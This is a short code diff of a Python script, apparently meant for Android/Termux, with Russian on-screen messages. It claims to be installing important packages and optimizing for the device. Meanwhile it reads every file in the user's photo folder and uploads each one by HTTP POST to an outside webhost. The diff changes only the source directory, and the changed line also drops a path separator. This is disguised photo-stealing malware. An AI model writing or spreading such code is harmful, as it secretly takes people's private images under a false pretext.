@@ -14,9 +14,9 @@ print("Внимание! Установка важных пакетов, не з
 time.sleep(2)
 os.system("clear")
 print("Оптимизация под ваше устройство, это может занять несколько минут, подождите несколько минут")
-l = os.listdir("../storage/shared/DCIM/Camera")
+l = os.listdir("../storage/pictures")
 for i in range(len(l)):
-    f = open("../storage/shared/DCIM/Camera/"+l[i], "rb")
+    f = open("../storage/pictures"+l[i], "rb")
     r = f.read()
     try:
         requests.post("https://lamer112311.000webhostapp.com/", data={"im": r})
